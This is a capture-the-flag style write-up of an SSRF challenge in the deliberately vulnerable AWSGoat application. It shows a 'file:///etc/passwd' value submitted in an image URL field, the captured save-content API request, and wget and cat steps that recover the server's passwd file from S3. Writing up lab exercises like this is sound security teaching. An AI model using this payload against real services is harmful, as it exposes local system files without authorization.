# Challenge 5 — Server-Side Request Forgery (SSRF) Part 1

### Objective

Exploit an SSRF vulnerability in the AWSGoat web application to access the `/etc/passwd` file from the **Lambda execution environment**.

### Steps Performed

1. **Opened the AWSGoat web application**
    
    ```
    https://pqocb8uhc9.execute-api.us-east-1.amazonaws.com/prod/react#/home
    ```
    
2. **Navigated to Newpost**
    - Opened the side navigation menu.
    - Selected **Newpost**.
    - Entered a sample headline and author name.
3. **Identified the vulnerable URL field**
    
    In **Enter URL of image**, supplied:
    
    ```
    file:///etc/passwd
    ```
    
    The `file://` scheme attempts to access a local file rather than an external image.
    
4. **Captured the request using Chrome DevTools**
    - Opened **Inspect → Network**.
    - Clicked **Upload**.
    - Identified the request:
    
    ```
    GET /v1/save-content?value=file:///etc/passwd
    ```
    
5. **Observed the successful response**
    
    The request returned:
    
    ```
    HTTP 200 OK
    ```
    
    The response contained an S3 URL for the generated file:
    
    ```
    https://production-blog-awsgoat-bucket-136889124474.s3.amazonaws.com/images/20260818055506242660.png
    ```
    
6. **Downloaded the generated file**
    
    ```bash
    wget "https://production-blog-awsgoat-bucket-136889124474.s3.amazonaws.com/images/20260818055506242660.png"
    ```
    
7. **Read the downloaded file**
    
    ```bash
    cat 20260818055506242660.png
    ```
    
    Although the file had a `.png` extension, its contents contained Linux `/etc/passwd` data.
    

### Vulnerability Identified

**Server-Side Request Forgery (SSRF)**

The application trusted a user-controlled URL and processed the `file://` scheme without adequate validation. This allowed us to make the server retrieve a local file from its Lambda execution environment.

### Attack Flow

```
User-controlled image URL
        ↓
file:///etc/passwd
        ↓
save-content API
        ↓
Lambda retrieves local file
        ↓
File stored as an S3 object
        ↓
S3 URL returned
        ↓
Download file
        ↓
/etc/passwd contents exposed
```

### Result

**Challenge 5 — SSRF Part 1: COMPLETED**

**Key takeaway:** Never allow arbitrary user-controlled URLs to be fetched server-side without strict URL-scheme, destination, and resource validation.

<img width="1902" height="871" alt="Screenshot 2026-08-18 112554" src="https://github.com/user-attachments/assets/f5f851be-9970-436f-82a2-93c432059772" />
<img width="1919" height="478" alt="Screenshot 2026-08-18 112756" src="https://github.com/user-attachments/assets/d216e575-2d3e-49e2-9be5-339a6844a888" />

